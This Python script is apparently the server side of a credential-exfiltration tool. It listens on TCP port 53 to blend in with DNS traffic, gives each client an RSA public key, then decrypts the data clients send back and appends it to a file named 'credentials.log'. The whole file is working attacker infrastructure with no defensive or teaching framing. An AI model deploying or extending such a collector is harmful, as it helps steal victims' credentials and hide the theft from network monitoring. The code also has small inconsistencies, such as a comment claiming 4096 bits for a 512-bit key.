#!/usr/bin/python3
# _*_ coding: utf-8 _*_ 

# todo
# port-forwarding
# manages different connections separately

# increased the buffer size
# added cryptography


import socket
# encryption and encoding
import rsa  
from base64 import b64decode


FILENAME = 'credentials.log'
rsa_data = b''  # hope it works

def generatekey():
    publickey,privatekey = rsa.newkeys(512,poolsize=8)  # 4096 bits
    serialized_publickey = publickey.save_pkcs1()  # to send the keys over a network in a standard format we use Serialization
    return serialized_publickey,privatekey
        

def main():

    # init keys
    serialized_publickey,privatekey = generatekey()

    #tcp connection
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(('',53)) # binding the socket
    server.listen()  # setting the server in listen mode
    print('[+] Server is up!')

    try:
        while True:
            conn, addr = server.accept()
            print(f'[+] Connection from {addr[0]}:{addr[1]}')

            # Sending the public key
            conn.send(serialized_publickey)

            try:
                while True:
                    # Receiving encoded encrypted data from the client
                    try:
                        rsa_data = b64decode(conn.recv(4096))
                    except NameError as e:
                        print(e)
                        break

                   
                    if not rsa_data:
                        print(f'[+] Connection Closed from {addr[0]}:{addr[1]}')
                        break
                        
                    try:
                        data = rsa.decrypt(rsa_data, privatekey).decode()  # decryption
                        print(data)  # Print received data

                        # Logging the received data to a file
                        with open(FILENAME, 'a+') as fh:
                            fh.write(data)
                            fh.write('\n')

                    except rsa.DecryptionError as e:
                        print(f'[+] Decryption failed: {e}')
                        continue

                print('[+] Received Successfully!')
                conn.close()  # Closing the connection
            
            except NameError as e:
                print(e)

    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    main()


